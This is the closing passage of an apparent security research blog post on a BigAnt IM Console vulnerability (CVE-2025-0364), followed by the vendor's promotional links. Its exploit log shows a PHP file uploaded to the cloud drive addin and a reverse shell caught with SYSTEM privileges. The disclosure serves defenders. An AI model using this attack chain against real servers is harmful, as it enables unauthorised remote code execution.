msg="Getting new PHP session and pinning the SaaS org to the session"\\ntime=2025-01-09T14:50:18.747-07:00 level=STATUS msg="Retrieving org SSID from demo page with session v1cir7mh9v4dfv4ik54mhq6so0"\\ntime=2025-01-09T14:50:18.764-07:00 level=STATUS msg="Retrieved SSID for LBJCUE: 387360F0-EECD-622B-5B90-C37F2BBD45B3"\\ntime=2025-01-09T14:50:18.765-07:00 level=STATUS msg="Activating SaaS organization"\\ntime=2025-01-09T14:50:22.627-07:00 level=STATUS msg="Authenticating to the addin SaaS admin"\\ntime=2025-01-09T14:50:22.673-07:00 level=STATUS msg="Visiting SaaS addin cloud drive page"\\ntime=2025-01-09T14:50:22.762-07:00 level=STATUS msg="Got cloud drive root path UUID: 99C8911A-DCB3-E5F2-4298-1E3567AA0DAD"\\ntime=2025-01-09T14:50:22.762-07:00 level=STATUS msg="Attempting to upload \`JQsaYCKEOu.php\` to cloud drive addin"\\ntime=2025-01-09T14:50:22.819-07:00 level=STATUS msg="Attempting to trigger final payload, timeout is expected after callback"\\ntime=2025-01-09T14:50:22.819-07:00 level=STATUS msg="Requesting final payload at: http://10.0.0.104:8000/data/387360F0-EECD-622B-5B90-C37F2BBD45B3/pan/99C8911A-DCB3-E5F2-4298-1E3567AA0DAD/2025-01-09/JQsaYCKEOu.php"\\ntime=2025-01-09T14:50:22.821-07:00 level=SUCCESS msg="Caught new shell from 10.0.0.104:51690"\\ntime=2025-01-09T14:50:22.821-07:00 level=STATUS msg="Active shell from 10.0.0.104:51690"\\nMicrosoft Windows \[Version 10.0.17763.107\]\\n(c) 2018 Microsoft Corporation. All rights reserved.\\n\\nC:\\Program Files (x86)\\BigAntSoft\\IM Console\\im\_webserver\\htdocs\\data\\387360F0-EECD-622B-5B90-C37F2BBD45B3\\pan\\99C8911A-DCB3-E5F2-4298-1E3567AA0DAD\\2025-01-09>whoami\\nwhoami\\nnt authority\\system\\n\\nC:\\Program Files (x86)\\BigAntSoft\\IM Console\\im\_webserver\\htdocs\\data\\387360F0-EECD-622B-5B90-C37F2BBD45B3\\pan\\99C8911A-DCB3-E5F2-4298-1E3567AA0DAD\\2025-01-09>^C\\n\`\`\`\\n\\nSometimes an incorrectly categorized CVSS vector is all it takes to motivate you to find something interesting.\\n\\n## About VulnCheck\\n\\nThe VulnCheck Initial Access team is always on the lookout for new exploitation in the wild. For more research like this, see our blogs, \[Four-Faith Industrial Router CVE-2024-12856 Exploited in the Wild\](https://vulncheck.com/blog/four-faith-cve-2024-12856), \[PaperCut Exploitation\](https://vulncheck.com/blog/papercut-rce), \[ProjectSend CVE-2024-11680 Exploited in the Wild\](https://vulncheck.com/blog/projectsend-exploited-itw), \[Fileless Remote Code Execution on Juniper Firewalls\\n\](https://vulncheck.com/blog/juniper-cve-2023-36845), and \[Does Confluence Dream of Shells?\](https://vulncheck.com/blog/confluence-dreams-of-shells)\\n\\nSign up to our website today to get free access to our \[VulnCheck KEV\](https://vulncheck.com/kev) and request a trial of our \[Initial Access Intelligence\](https://vulncheck.com/product/initial-access-intelligence) and \[Exploit & Vulnerability Intelligence\](https://vulncheck.com/product/exploit-intelligence) products.\\n

#### [Source](https://vulncheck.com/blog/bigant-cve-2025-0364)

<br/>
---
